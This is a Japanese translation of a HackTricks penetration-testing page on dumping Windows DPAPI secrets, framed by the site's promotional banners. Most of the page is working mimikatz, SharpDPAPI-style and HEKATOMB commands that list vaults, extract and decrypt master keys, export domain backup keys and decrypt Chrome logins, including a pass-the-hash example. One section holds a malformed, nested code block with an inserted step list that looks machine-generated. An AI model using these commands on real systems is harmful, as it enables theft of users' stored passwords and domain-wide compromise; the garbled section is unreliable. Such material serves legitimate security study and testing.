# DPAPI - パスワードの抽出

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。この大会は、技術的な知識を促進することを目的としており、あらゆる分野の技術とサイバーセキュリティの専門家のための活気ある交流の場です。

{% embed url="https://www.rootedcon.com/" %}

この投稿を作成する際、mimikatzはDPAPIとの対話を伴うすべてのアクションで問題が発生していました。そのため、**ほとんどの例と画像は**こちらから取得しました：[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## DPAPIとは

Windowsオペレーティングシステムでの主な使用目的は、非対称な秘密鍵の対称暗号化を実行するために、ユーザーまたはシステムの秘密をエントロピーの重要な要素として使用することです。\
**DPAPIを使用すると、開発者はユーザーのログオンシークレットから派生した対称鍵を使用してキーを暗号化**することができます。また、システムの暗号化の場合は、システムのドメイン認証シークレットを使用します。

これにより、開発者は**暗号化キーを保護する方法を心配することなく**、コンピュータに**暗号化されたデータを保存**することが非常に簡単になります。

### DPAPIは何を保護するのか？

DPAPIは、次の個人データを保護するために使用されます：

* Internet Explorer、Google \*Chromeのパスワードとフォームの自動入力データ
* Outlook、Windows Mail、Windows Mailなどのメールアカウントのパスワード
* 内部FTPマネージャーアカウントのパスワード
* 共有フォルダとリソースへのアクセスパスワード
* ワイヤレスネットワークアカウントのキーとパスワード
* Windows CardSpaceとWindows Vaultの暗号化キー
* リモートデスクトップ接続のパスワード、.NET Passport
* 暗号化ファイルシステム（EFS）、メールS-MIMEの暗号化、他のユーザーの証明書、Internet Information ServicesのSSL/TLSのプライベートキー
* EAP/TLSおよび802.1x（VPNおよびWiFi認証）
* 資格情報マネージャーのネットワークパスワード
* API関数CryptProtectDataでプログラム的に保護された任意のアプリケーションの個人データ。たとえば、Skype、Windows Rights Management Services、Windows Media、MSNメッセンジャー、Google Talkなど。
* ...

{% hint style="info" %}
DPAPIを使用してデータを保護するための成功した賢い方法の例は、Internet Explorerの自動入力パスワード暗号化アルゴリズムの実装です。特定のWebページのログインとパスワードを暗号化するために、CryptProtectData関数を呼び出し、オプションのエントロピーパラメータにはWebページのアドレスを指定します。したがって、パスワードが入力された元のURLを知らない限り、Internet Explorer自体も含めて、そのデータを復号化することはできません。
{% endhint %}

## リストVault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 資格情報ファイル

**マスターパスワードで保護された資格情報ファイル**は、次の場所に存在する可能性があります：
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
以下は、mimikatzの`dpapi::cred`を使用して資格情報の情報を取得する方法です。レスポンスには、暗号化されたデータとguidMasterKeyなどの興味深い情報が含まれています。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
適切な `/masterkey` を使用して、**mimikatzモジュール** `dpapi::cred` を使用して復号化できます：
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## マスターキー

ユーザーのRSAキーを暗号化するために使用されるDPAPIキーは、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに格納されます。ここで、{SID}はそのユーザーの[**セキュリティ識別子**](https://en.wikipedia.org/wiki/Security\_Identifier)です。**DPAPIキーは、ユーザーの秘密鍵を保護するマスターキーと同じファイルに格納されます**。通常、これは64バイトのランダムデータです。（このディレクトリは保護されているため、`cmd`から`dir`を使用してリストすることはできませんが、PSからはリストすることができます）。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
ユーザーのマスターキーの一部は次のようになります：

![](<../../.gitbook/assets/image (324).png>)

通常、**各マスターキーは他のコンテンツを復号化できる暗号化された対称キー**です。したがって、**他のコンテンツ**を復号化するために後で使用するために、**暗号化されたマスターキー**を**抽出する**ことは興味深いです。

### マスターキーの抽出と復号化

前のセクションで、`3e90dd9e-f901-40a1-b691-84d7f647b8fe`のように見えるguidMasterKeyを見つけました。このファイルは以下にあります：
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
以下の場所で、mimikatzを使用してマスターキーを抽出することができます:

```plaintext
1. ローカルマシンのメモリからマスターキーを抽出するために、mimikatzのsekurlsaモジュールを使用します。

2. mimikatzを実行し、コマンドプロンプトで以下のコマンドを入力します:
   ```
   sekurlsa::dpapi
   ```

3. マスターキーを抽出するために、以下のコマンドを入力します:
   ```
   dpapi::masterkey
   ```

4. マスターキーが抽出されると、その値を使用してデータを復号化することができます。
```
```

注意: この手法は管理者権限が必要です。また、Windowsのバージョンやセキュリティ設定によっては、マスターキーの抽出が制限される場合があります。
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
ファイルのマスターキーは出力に表示されます。

最後に、その**マスターキー**を使用して**資格情報ファイル**を**復号化**できます：
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### 管理者権限でローカルのマスターキーを抽出する

管理者権限を持っている場合、以下の手順でdpapiのマスターキーを取得することができます。
```
sekurlsa::dpapi
```
![](<../../.gitbook/assets/image (326).png>)

### ドメイン管理者によるすべてのバックアップマスターキーの抽出

ドメイン管理者は、暗号化されたキーを復号化するために使用できるバックアップdpapiマスターキーを取得することができます。
```
lsadump::backupkeys /system:dc01.offense.local /export
```
![](<../../.gitbook/assets/image (327).png>)

取得したバックアップキーを使用して、ユーザーの `spotless` マスターキーを復号化しましょう:
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
ユーザーの`spotless` chromeの秘密を、復号化されたマスターキーを使用して復号化することができます。
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
![](<../../.gitbook/assets/image (329).png>)

## コンテンツの暗号化と復号化

DAPIを使用してデータを暗号化および復号化する方法の例については、mimikatzとC++を使用した[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)を参照してください。\
C#を使用してDPAPIを使用してデータを暗号化および復号化する方法の例については、[https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)を参照してください。

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1)は、[@gentilkiwi](https://twitter.com/gentilkiwi)の[Mimikatz](https://github.com/gentilkiwi/mimikatz/)プロジェクトからの一部のDPAPI機能をC#に移植したものです。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)は、LDAPディレクトリからすべてのユーザーとコンピュータを抽出し、RPCを介してドメインコントローラのバックアップキーを抽出するツールです。その後、スクリプトはすべてのコンピュータのIPアドレスを解決し、すべてのユーザーのDPAPIブロブを取得し、ドメインバックアップキーですべてを復号化します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAPのコンピュータリストから抽出した場合、知らなくてもすべてのサブネットを見つけることができます！

"Domain Admin権限だけでは十分ではありません。すべてをハックしましょう。"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)は、DPAPIで保護されたシークレットを自動的にダンプすることができます。

## 参考文献

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術的な知識を促進することを使命としているこの会議は、あらゆる分野の技術とサイバーセキュリティの専門家の活発な交流の場です。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksで会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見してください。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
